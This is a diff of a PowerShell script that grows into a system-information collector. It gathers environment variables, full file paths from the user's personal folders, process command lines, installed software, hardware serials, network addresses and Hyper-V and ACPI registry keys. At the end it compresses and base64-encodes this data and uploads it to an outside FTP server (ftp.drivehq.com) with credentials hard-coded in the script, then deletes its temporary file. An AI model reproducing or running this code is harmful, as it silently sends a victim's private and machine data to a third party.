@@ -2,38 +2,13 @@ function Get_BIOS_Registry() {
 	$output = '{"BIOS Registry":'
 	$output += '['
 
-	try {
-		# Win10
-		try {
-			$props = @("BiosMajorRelease", "BiosMinorRelease", "ECFirmwareMajorRelease", "ECFirmwareMinorRelease", "BaseBoardManufacturer", "BaseBoardProduct", "BaseBoardVersion", "BIOSReleaseDate", "BIOSVendor", "BIOSVersion", "SystemFamily", "SystemManufacturer", "SystemProductName", "SystemSKU", "SystemVersion")
-			$obj = Get-ItemProperty -Path "HKLM:\\Hardware\\Description\\System\\BIOS" | Select-Object -Property $props
-		}
-		catch {
-			$ErrorMessage = $_.Exception.Message
-			$output += '{"BIOS":"' + $ErrorMessage + '"}'
-		}
-		if (!$obj) {
-			try {
-				$props = @("Identifier", "SystemBIOSDate", "SystemBIOSVersion", "VideoBIOSVersion")
-				$obj = Get-ItemProperty -Path "HKLM:\\Hardware\\Description\\System" | Select-Object -Property $props
-			}
-			catch {
-				$ErrorMessage = $_.Exception.Message
-				$output += '{"BIOS":"' + $ErrorMessage + '"}'
-			}
-		}
-		if ($obj) {
-			ForEach ($prop in $props) {
-				$output += '{"' + $prop + '":"' + $obj.$prop + '"},'
-			}
-			# remove trailing ',' character
-			$output = $output -replace ".$"
-		}
-	}
-	catch {
-		$ErrorMessage = $_.Exception.Message
-		$output += '{"BIOS":"No more attempts"}'
-	}
+	$key = "HKLM:\Hardware\Description\System\BIOS"
+	$output += Registry_Values_Query $key
+
+	$output += ','
+	$key = "HKLM:\Hardware\Description\System"
+	$output += Registry_Values_Query $key
+
 	$output += ']'
 	$output += '}'
 
@@ -42,56 +17,26 @@ function Get_BIOS_Registry() {
 
 function Get_Environment_Variables() {
 	$output = '{"Environment Variables":'
-	$output += '['
+	$output += '{'
 
-	<#
-	Foreach ($item in Get-ChildItem -Path Env:\)
-	{
-		Write-Host $item.Name
+	$vars = Get-ChildItem -Path Env:\ | Select-Object -Property Name, Value
+	ForEach ($var in $vars) {
+		$output += '"' +$var.Name+ '":"' +$var.Value+ '",'
 	}
-	#>
 
-	$output += '{"ALLUSERSPROFILE":' + '"' + $env:ALLUSERSPROFILE + '"},'
-	$output += '{"APPDATA":' + '"' + $env:APPDATA + '"},'
-	$output += '{"CommonProgramFiles":' + '"' + $env:CommonProgramFiles + '"},'
-	$output += '{"CommonProgramFiles(x86)":' + '"' + ${env:CommonProgramFiles(x86)} + '"},'
-	$output += '{"COMPUTERNAME":' + '"' + $env:COMPUTERNAME + '"},'
-	$output += '{"ComSpec":' + '"' + $env:ComSpec + '"},'
-	$output += '{"HOMEDRIVE":' + '"' + $env:HOMEDRIVe + '"},'
-	$output += '{"HOMEPATH":' + '"' + $env:HOMEPATH + '"},'
-	$output += '{"LOCALAPPDATA":' + '"' + $env:LOCALAPPDATA + '"},'
-	$output += '{"LOGONSERVER":' + '"' + $env:LOGONSERVER + '"},'
-	$output += '{"NUMBER_OF_PROCESSORS":' + '"' + $env:NUMBER_OF_PROCESSORS + '"},'
-	$output += '{"OS":' + '"' + $env:OS + '"},'
-	$output += '{"Path":' + '"' + $env:Path + '"},'
-	$output += '{"PROCESSOR_ARCHITECTURE":' + '"' + $env:PROCESSOR_ARCHITECTURE + '"},'
-	$output += '{"PROCESSOR_IDENTIFIER":' + '"' + $env:PROCESSOR_IDENTIFIER + '"},'
-	$output += '{"PROCESSOR_LEVEL":' + '"' + $env:PROCESSOR_LEVEL + '"},'
-	$output += '{"PROCESSOR_REVISION":' + '"' + $env:PROCESSOR_REVISION + '"},'
-	$output += '{"ProgramFiles":' + '"' + $env:ProgramFiles + '"},'
-	$output += '{"ProgramFiles(x86)":' + '"' + ${env:ProgramFiles(x86)} + '"},'
-	$output += '{"PROMPT":' + '"' + $env:PROMPT + '"},'
-	$output += '{"PUBLIC":' + '"' + $env:PUBLIC + '"},'
-	$output += '{"SystemDrive":' + '"' + $env:SystemDrive + '"},'
-	$output += '{"SystemRoot":' + '"' + $env:SystemRoot + '"},'
-	$output += '{"TEMP":' + '"' + $env:TEMP + '"},'
-	$output += '{"TMP":' + '"' + $env:TMP + '"},'
-	$output += '{"USERDOMAIN":' + '"' + $env:USERDOMAIN + '"},'
-	$output += '{"USERDOMAIN_ROAMINGPROFILE":' + '"' + $env:USERDOMAIN_ROAMINGPROFILE + '"},'
-	$output += '{"USERNAME":' + '"' + $env:USERNAME + '"},'
-	$output += '{"USERPROFILE":' + '"' + $env:USERPROFILE + '"},'
-	$output += '{"windir":' + '"' + $env:windir + '"},'
 	# remove trailing ',' character
 	$output = $output -replace ".$"
-	$output += ']'
+	$output += '}'
 	$output += '}'
 
 	return $output
 }
 
 function Get_Files() {
-	Write-Host "File List"
-	Write-Host "========="
+	$output = '{"Files":'
+	$output += '{'
+	$error_counter = 0
+
 	$folders = @(".")
 	$folders += $home + "\Desktop"
 	$folders += $home + "\Documents"
@@ -106,38 +51,100 @@ function Get_Files() {
 	$folders += $home + "\My Pictures"
 	$folders += $home + "\My Videos"
 
-	$ErrorActionPreference= 'silentlycontinue'
-	for ($i=0; $i -lt $folders.length; $i++) {
-			Get-ChildItem -Recurse -Path $folders[$i]
+	# add more target folders as needed
+	For ($i=0; $i -lt $folders.Length; $i++) {
+		try {
+			$obj = Get-ChildItem -Recurse -Force -Path $folders[$i] # Name, DirectoryName, BaseName, FullName
+			For($j=0; $j -lt $obj.Length; $j++) {
+				# avoid .lnk shortcuts, etc
+				if ($obj[$j].DirectoryName) {
+					# hack because Get-ChildItem recursively does breadth first, then depth
+					#$output += '"File_' +$j+ '_' +$obj[$j].DirectoryName+ '":"' +$obj[$j].Name+ '",'
+					$output += '"File_' +$j+ '":"' +$obj[$j].FullName+ '",'
+				}
+			}
+		}
+		catch {
+			$ErrorMessage = $_.Exception.Message
+			$output += '"Error_' +$error_counter+ '":"' + $ErrorMessage + '",'
+		}
 	}
-	$ErrorActionPreference= 'Continue'
+	# remove trailing ',' character
+	$output = $output -replace ".$"
+	$output += '}'
+	$output += '}'
+
+	return $output
+}
+
+function Get_Hyper_V() {
+	$output = '{"hyperv":'
+	$output += '['
+
+	$key = "HKLM:\SOFTWARE\Microsoft"
+	$output += Registry_Key_Query $key
+
+	$output += ','
+	$key = "HKLM:\HARDWARE\ACPI\FADT"
+	$output += Registry_Key_Query $key
+
+	$output += ','
+	$key = "HKLM:\HARDWARE\ACPI\RSDT"
+	$output += Registry_Key_Query $key
+
+	$output += ']'
+	$output += '}'
+
+	return $output
 }
 
 function Get_Installed_Programs_Registry(){
-	Write-Host "Installed programs from Registry"
-	Write-Host "================================"
+	$output = '{"Registry Installed Programs":'
+	$output += '['
+
 	$keys = @()
 	$keys += "HKLM:\Software"
 	$keys += "HKLM:\Software\Wow6432Node"
 	$keys += "HKCU:\Software"
 	$keys += "HKCU:\Software\Wow6432Node"
+
 	Foreach ($k in $keys) {
-		Get-ChildItem $k | Select-Object -Property Name
+		$key = $k
+		$output += Registry_Key_Query $key
+		#Get-ChildItem $k | Select-Object -Property Name
+		$output += ','
 	}
+
+	# remove trailing ',' character
+	$output = $output -replace ".$"
+	$output += ']'
+	$output += '}'
+
+	return $output
 }
+
 function Get_Procs() {
-	$proc = Get-WMIObject -Query "SELECT * FROM Win32_Process" | Select-Object -Property Caption, Description, Name, ProcessName, CommandLine, ExecutablePath, Path
-	$proc
+	$output = '{"Running Processes":'
+	$output += '['
+
+	$props = @("Caption", "Description", "Name", "ProcessName", "CommandLine", "ExecutablePath", "Path")
+	$class = "Win32_Process"
+	$output += WMI_Query $class $props
+
+	$output += ']'
+	$output += '}'
+
+	return $output
 }
 
 function Get_Wallpaper() {
 	$output = '{"Wallpaper":'
-	$output += '['
+	$output += '{'
 
 	try {
 		$obj = Get-ItemProperty -path "HKCU:\Control Panel\Desktop" -name "WallPaper" | Select-Object -Property WallPaper
 		if ($obj) {
-			$output += '{"Wallpaper":"' + $obj.WallPaper + '"}'
+			$output += '"Location":"' + $obj.WallPaper + '",'
 		}
 
 		if ($obj.WallPaper) {
@@ -148,7 +155,7 @@ function Get_Wallpaper() {
 				}
 				catch {
 					$ErrorMessage = $_.Exception.Message
-					$output += ',{"Wallpaper CertUtil SHA256":"' + $ErrorMessage + '"}'
+					$output += '"Wallpaper CertUtil SHA256":"' + $ErrorMessage + '",'
 				}
 				if (!$hash) {
 					try {
@@ -156,24 +163,26 @@ function Get_Wallpaper() {
 					}
 					catch {
 						$ErrorMessage = $_.Exception.Message
-						$output += ',{"Wallpaper MD5Sum":"' + $ErrorMessage + '"}'
+						$output += '"Wallpaper MD5Sum":"' + $ErrorMessage + '",'
 					}
 				}
 				if ($hash) {
-					$output += ',{"Wallpaper Hash":"' + $hash + '"}'
+					$output += '"Wallpaper Hash":"' + $hash + '",'
 				}
 			}
 			catch {
 				$ErrorMessage = $_.Exception.Message
-				$output += ',{"Wallpaper Hash":"No more attempts"}'
+				$output += '"Wallpaper Hash":"No more attempts",'
 			}
 		}
 	}
 	catch {
 		$ErrorMessage = $_.Exception.Message
-		$output += '{"Wallpaper":"' + $ErrorMessage + '"}'
+		$output += '"Wallpaper":"' + $ErrorMessage + '",'
 	}
-	$output += ']'
+	# remove trailing ',' character
+	$output = $output -replace ".$"
+	$output += '}'
 	$output += '}'
 
 	return $output
@@ -184,7 +193,7 @@ function Get_WMI_Data() {
 	$output += '['
 
 	$props = @("Name", "Description", "Version", "BIOSVersion", "Manufacturer", "PrimaryBIOS", "SerialNumber")
-	$class = "Win32_Bios"
+	$class = "Win32_BIOS"
 	$output += WMI_Query $class $props
 
 	$output += ','
@@ -195,135 +204,254 @@ function Get_WMI_Data() {
 	$output += WMI_Query $class $props
 
 	$output += ','
-	#$props = @("IdentifyingNumber", "Name", "Version", "Caption", "Description", "SKUNumber", "UUID", "Vendor", "__PATH", "__RELPATH", "Path")
-	$props = @("IdentifyingNumber", "Name", "Version", "Caption", "Description", "SKUNumber", "UUID", "Vendor")
+	$props = @("IdentifyingNumber", "Name", "Version", "Caption", "Description", "SKUNumber", "UUID", "Vendor", "__PATH", "__RELPATH", "Path")
 	$class = "Win32_ComputerSystemProduct"
 	$output += WMI_Query $class $props
 
-	<#
 	$output += ','
-	$props = @("Antecedent", "Dependent", "__PATH", "__RELPATH")
+	$props = @("Antecedent", "Dependent")
 	$class = "Win32_DeviceBus"
 	$output += WMI_Query $class $props
 
 	$output += ','
+	$props = @("Caption", "Model", "Name", "PNPDeviceID", "SerialNumber")
+	$class = "Win32_DiskDrive"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("Caption", "Description", "DeviceName", "SettingID", "Path")
+	$class = "Win32_DisplayConfiguration"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("Caption", "Description", "Name", "SettingID", "Path")
+	$class = "Win32_DisplayControllerConfiguration"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("Name", "Caption", "Description", "Manufacturer", "ProductName", "ServiceName")
+	$class = "Win32_NetworkAdapter"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("Caption", "Description", "DHCPLeaseObtained", "DNSHostName", "IPAddress", "MACAddress", "ServiceName")
+	$class = "Win32_NetworkAdapterConfiguration"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("Description")
+	$class = "Win32_OnBoardDevice"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("BootDevice", "Caption", "Version", "CSName", "CountryCode", "CurrentTimeZone", "Name")
+	$class = "Win32_OperatingSystem"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("BankLabel", "Capacity", "Caption", "Description", "DeviceLocator", "Manufacturer", "PartNumber", "SerialNumber")
+	$class = "Win32_PhysicalMemory"
+	$output += WMI_Query $class $props
+
+	<# TOO SLOW?  #>
+	$output += ','
+	$props = @("Caption")
+	$class = "Win32_Product"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("DisplayName")
+	$class = "Win32_Service"
+	$output += WMI_Query $class $props
+
+	$output += ','
+	$props = @("AdapterCompatibility", "AdapterRAM", "Caption", "Description", "Name", "VideoProcessor")
+	$class = "Win32_VideoController"
+	$output += WMI_Query $class $props
+
+	<#
+	$output += ','
 	$props = @("")
 	$class = ""
 	$output += WMI_Query $class $props
-
-
-	$wmi = Get-WMIObject -Query "SELECT * FROM Win32_DeviceBus" |
-	   Select-Object -Property Antecedent, Dependent, __PATH, __RELPATH #| Format-List
-	Write-Host "Win32_DeviceBus"
-	$wmi
-
-	$wmi = Get-WMIObject -Query "SELECT * FROM Win32_DiskDrive" |
-	   Select-Object -Property Caption, Model, Name, PNPDeviceID, SerialNumber
-    Write-Host "Win32_DiskDrive"
-	$wmi
-
-	$wmi = Get-WMIObject -Query "SELECT * FROM Win32_DisplayConfiguration" |
-	   Select-Object -Property __RELPATH, __PATH, Caption, Description, DeviceName,
-	   SettingID, Path
-	Write-Host "Win32_DisplayConfiguration"
-	$wmi
-
-	$wmi = Get-WMIObject -Query "SELECT * FROM Win32_DisplayControllerConfiguration" |
-	   Select-Object -Property __RELPATH, __PATH, Caption, Description, Name,
-	   SettingID, Path
-	Write-Host "Win32_DisplayControllerConfiguration"
-	$wmi
-
-	$wmi = Get-WMIObject -Query "SELECT * FROM Win32_NetworkAdapter" |
-	   Select-Object -Property Name, Caption, Description, Manufacturer, ProductName,
-	   ServiceName #| Format-List
-	Write-Host "Win32_NetworkAdapter"
-	$wmi
 	#>
+
 	$output += ']'
 	$output += '}'
 
 	return $output
 }
 
-function Hyper_V() {
-	$output = '{"hyperv":'
-	$output += '['
+function Registry_Key_Query() {
+	Param($key)
+	$output = ''
 
+	$output += '{"' +$key+ '":{'
 	try {
-	    $obj = Get-ChildItem HKLM:\SOFTWARE\Microsoft | Select-Object -Property Name
-		if ($obj) {
+	    $obj = Get-ChildItem $key | Select-Object -Property Name
+		if ($obj.length) {
 			For ($i=0; $i -lt $obj.Length; $i++) {
-				$output += '{"Key_' + $i + '":"' + $obj[$i].Name + '"},'
+				$name = $obj[$i].Name.Split("\\")[-1]
+				$output += '"Key_' +$i+ '":"' +$name+ '",'
 			}
-			# remove trailing ',' character
-			$output = $output -replace ".$"
+		}
+		else{
+			$name = $obj.Name.Split("\\")[-1]
+			$output += '"Key_0":"' +$name+ '",'
 		}
 	}
 	catch {
 		$ErrorMessage = $_.Exception.Message
-		$output += '{"HKLM\SOFTWARE\Microsoft":"' + $ErrorMessage + '"}'
+		$output += '"Error":"' + $ErrorMessage + '",'
 	}
+	# remove trailing ',' character
+	$output = $output -replace ".$"
+	$output += '}}'
+	return $output
+}
+
+function Registry_Values_Query() {
+	Param($key)
+	$names = @()
+	$output = ''
 
 	try {
-		$obj = Get-ItemProperty HKLM:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion | Select-Object -Property SystemBiosVersion
-		if ($obj) {
-			$output += ',{"BIOS Version":"' + $obj.SystemBiosVersion + '"}'
+		$obj = Get-Item -Path $key
+		ForEach ($o in $obj) {
+			$names += $o.GetValueNames()
+		}
+		if ($names.length) {
+			$output += '{"' +$key+ '":{'
+			ForEach ($name in $names) {
+				$output += '"' +$name+ '":"' +$obj.GetValue($name)+ '",'
+			}
+		}
+		else {
+			$output += '{"' +$key+ '":{'
+			$output += '"":"",'
 		}
 	}
 	catch {
 		$ErrorMessage = $_.Exception.Message
-		$output += ',{"BIOS Version":"' + $ErrorMessage + '"}'
+		$output += '{"' + $key + '":{'
+		$output += '"Error":"' +$ErrorMessage+ '",'
 	}
 
-	try {
-		$obj = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT | Select-Object -Property Name
-		if ($obj) {
-			$output += ',{"FADT":"' + $obj.Name + '"}'
-		}
-	}
-	catch {
-	}
-
-	try {
-		$obj = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT | Select-Object -Property Name
-		if ($obj) {
-			$output += ',{"RSDT":"' + $obj.Name + '"}'
-		}
-	}
-	catch {}
-	$output += ']'
-	$output += '}'
-
+	# remove trailing ',' character
+	$output = $output -replace ".$"
+	$output += '}}'
 	return $output
 }
 
 function WMI_Query() {
 	Param($class, $props)
 
-	$output = ''
+	$output = '{"' + $class + '":'
+	$output += '['
+
+	# make sure the class exists in the first place
+	try{
+		$placeholder = Get-WMIObject -Class $class
+	}
+	catch{
+		$ErrorMessage = $_.Exception.Message
+		$ErrorMessage = $ErrorMessage -replace '"', "'"
+		$output += '{"Error":"' + $ErrorMessage + '"}'
+		$output += ']'
+		$output += '}'
+		return $output
+	}
+
 	try {
 		$wmi = Get-WMIObject -Query "SELECT * FROM $class" | Select-Object -Property $props
 		if ($wmi) {
-			ForEach ($prop in $props) {
-				#$prop -replace '"', "'"
-				$output += '{"' + $class + '.' + $prop + '":"' + $wmi.$prop + '"},'
+			ForEach ($w in $wmi)
+			{
+				$output += '{'
+				ForEach ($prop in $props) {
+					$w.$prop = $w.$prop -replace '"', "'"
+					$output += '"' + $prop + '":"' + $w.$prop + '",'
+				}
+				# remove trailing ',' character
+				$output = $output -replace ".$"
+				$output += '},'
 			}
+		}
+		else {
+			$output += '{"' + $prop + '":""},'
 		}
 		# remove trailing ',' character
 		$output = $output -replace ".$"
 	}
 	catch {
 		$ErrorMessage = $_.Exception.Message
-		$output += '{"$class":"' + $ErrorMessage + '"}'
+		$output += '{"' + $class + '":"' + $ErrorMessage + '"}'
 	}
+	$output += ']'
+	$output += '}'
+
 	return $output
 }
 
-$ErrorActionPreference = 'stop'
-$out = '['
+function Zencrypt() {
+	Param($str)
+	$str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 
-$out += Hyper_V
+	return $str
+}
+
+function Zcompress() {
+	Param($str)
+	$stream = New-Object System.IO.MemoryStream
+	$gzip = New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Compress)
+	$writer = New-Object System.IO.StreamWriter($gzip)
+	$writer.Write($str)
+	$writer.Close();
+	$str = [System.Convert]::ToBase64String($stream.ToArray())
+	return $str
+}
+
+function Zdcom() {
+	Param ($str)
+	$data = [System.Convert]::FromBase64String($str)
+	$stream = New-Object System.IO.MemoryStream
+	$stream.Write($data, 0, $data.Length)
+	$stream.Seek(0,0) | Out-Null
+	$reader = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Decompress))
+	return $reader.readLine().ToCharArray()
+}
+
+function Zend() {
+	Param ($str)
+	$username = 'crazyrockinsushi'
+	$password = '$5OffToday' # $5Off
+	$server = "ftp://ftp.drivehq.com/"
+	$file = 'zinfo.txt'
+
+	Set-Content -Path $file -Value $str
+
+	$ftp = [System.Net.FtpWebRequest]::Create($server+$file)
+	$ftp = [System.Net.FtpWebRequest]$ftp
+	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+	$ftp.Credentials = new-object System.Net.NetworkCredential($username, $password)
+	$ftp.UseBinary = $true
+	$ftp.UsePassive = $true
+	$content = [System.IO.File]::ReadAllBytes($file)
+	$ftp.ContentLength = $content.Length
+	$rs = $ftp.GetRequestStream()
+	$rs.Write($content, 0, $content.Length)
+	$rs.Close()
+	$rs.Dispose()
+
+	Remove-Item $file
+}
+
+# supress noisy errors
+$ErrorActionPreference = 'stop'
+
+# manually build the JSON output string
+$out = '['
+$out += Get_Hyper_V
 $out += ','
 $out += Get_Environment_Variables
 $out += ','
@@ -331,11 +459,16 @@ $out += Get_Wallpaper
 $out += ','
 $out += Get_BIOS_Registry
 $out += ','
-$out += Get_WMI_Data	#to be continued
-#Get_Procs
-#Get_Files
-#Get_Installed_Programs_Registry
+$out += Get_WMI_Data	#to be continued  finished CIMV2
+$out += ','
+$out += Get_Procs
+$out += ','
+$out += Get_Files
+$out += ','
+$out += Get_Installed_Programs_Registry
 $out += ']'
 $out = $out -replace '\\', '\\'
-Write-Host $out
-# OS VERSION
+
+$out = Zcompress $out
+$out = Zencrypt $out
+Zend $out
